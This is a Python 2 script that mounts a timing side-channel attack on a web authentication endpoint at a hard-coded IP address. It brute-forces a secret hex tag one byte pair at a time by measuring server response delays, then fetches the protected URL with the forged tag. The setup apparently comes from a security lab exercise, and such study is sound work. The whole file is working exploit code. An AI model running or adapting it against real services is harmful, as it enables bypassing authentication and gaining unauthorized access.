import urllib2
import string
import time
from requests.exceptions import HTTPError
import timeit
import requests
import constant
import sys
from math import sqrt


def toHex(tag):
	temp = []
	for item in tag:
		temp.append(hex(item)[2:])
	str1 = ''.join(temp)
	#print temp
	#print str1
	return str1


def sampleTime(tag):
	timeArray = [0] * constant.NO_OF_TESTS
	for x in range (constant.NO_OF_TESTS):
		try:
			timeArray[x] = requests.get("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		except:
			print "ERROR"
	return min(timeArray)
	
def verifyBits(tag,pos, meanTime, longest, prevTime):
	print "in verifyBits"
	verified = 0
	connectionTimes = [0.0] * 17
	connectionTimes[pos/2] = longest
	print "connectionTimes[" + str(pos/2) + "]: " + str(connectionTimes[pos/2])
	print "prevTime: " + str(prevTime)
	print "Delta time: " + str((connectionTimes[pos/2] - prevTime) * 1000)
	#print "constant: " + str(float(constant.TIMEOUT)/1000)
	print "constantskit: " + str((prevTime + float(constant.TIMEOUT)/1000))
	if connectionTimes[pos/2] < (prevTime + float(constant.TIMEOUT/1000)):
		print "[!]WARNING: The connection times for this byte was shorter than or equal to the preceeding. This might indicate wrong byte."
		raw_input("Press Enter to continue")
	elif connectionTimes[pos/2] > prevTime:
		verified = 1
	return verified
	
def increaseTag(tag, pos):
	tag[pos + 1] += 1
	if tag[pos + 1] > 15:
		tag[pos] += 1
		tag[pos + 1] = 0
	return tag


def tryTag(tag, pos, meanTime):
	timeArray = [0] * constant.NO_OF_TESTS
	longest = [0.0] * 3
	progress = 0
	prevTime = meanTime
	verified = 0
	counter = 1
	print "in try tag"
	while pos <= 30: #Could be <= 30?
		#print tag
		#print str(progress) + "% \r",
		#sys.stdout.write(str(progress) + '%')
		#sys.stdout.flush()
		#sys.stdout.write("\b")
		for x in range (constant.NO_OF_TESTS):
			timeArray[x] = requests.get("http://130.243.27.198/auth/"+ str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
		connectionTime = min(timeArray)
		if connectionTime > longest[0]:
			longest[0] = connectionTime
			longest[1] = tag[pos]
			longest[2] = tag[pos + 1]
			#print "Best candidate: Time: " + str(longest[0]) + " | " + str(longest[1]) + str(longest[2])
		#print "meanTime: " + str(meanTime)
		#print "connectionTime: " + str(connectionTime)
		tag = increaseTag(tag, pos)
		if tag[pos] > 15:
			tag[pos] = longest[1]
			tag[pos + 1] = longest[2]
			verified = verifyBits(tag,pos,meanTime,longest[0], prevTime)
			if verified == 1 or counter == 3:
				print "#Current tag: " + str(toHex(tag) + " Time: " + str(longest[0]) + " Previous time: " + str(prevTime) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
				progress += 1
				pos += 2
				prevTime = longest[0]
				longest[0] = 0.0
			elif verified == 0:
				print "Something weird with the times...Re-running test on bit: " + str(toHex(tag) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
				tag[pos] = 0
				tag[pos + 1] = 0
				print "Counter: " + str(counter)
				counter += 1
		#print tag
	return tag


#timeConst = ((float(constant.TIMEOUT)/1000))-(float(constant.TIMEOUT)/10000) #How much the waiting time will increase after each found byte-pair. With a safety marginal
currentTag = [0] * 32 #Create a tag containing all 0
meanTime = sampleTime(currentTag) #Calculate mean time for server parsing on currentTag
#print meanTime
currentTag = tryTag(currentTag, 0, meanTime) #Find the correct tag!
print currentTag

try:
	contents = urllib2.urlopen("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(currentTag)).read()
	print contents
except urllib2.HTTPError as error:
	if error.code == 404:
		print 'We got a 404'
		print error
	else:
		print error
